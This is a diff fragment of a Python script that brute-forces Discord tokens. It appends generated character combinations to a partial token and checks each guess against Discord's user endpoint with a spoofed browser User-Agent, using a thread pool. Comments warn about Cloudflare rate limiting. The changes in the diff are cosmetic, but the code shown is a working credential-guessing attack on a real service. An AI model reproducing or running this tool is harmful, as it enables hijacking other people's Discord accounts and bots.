@@ -35,7 +35,8 @@ def validateToken(token, bot=True):
         token = "Bot " + token
     req = Request("https://discord.com/api/v9/users/@me", headers={
         "Authorization": token,
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"#beware cloudflare
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
+        # beware cloudflare
     })
     try:
         response = urllib.request.urlopen(req)
@@ -51,9 +52,10 @@ def validateToken(token, bot=True):
         pass
     return None
 
+
 def main():
     futures = []
-    executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)#beware cloudflare
+    executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)  # beware cloudflare
     for i in range(totalCombos):
         combos = generateCombos(guessLength, i)
         combos = CurrentToken + combos
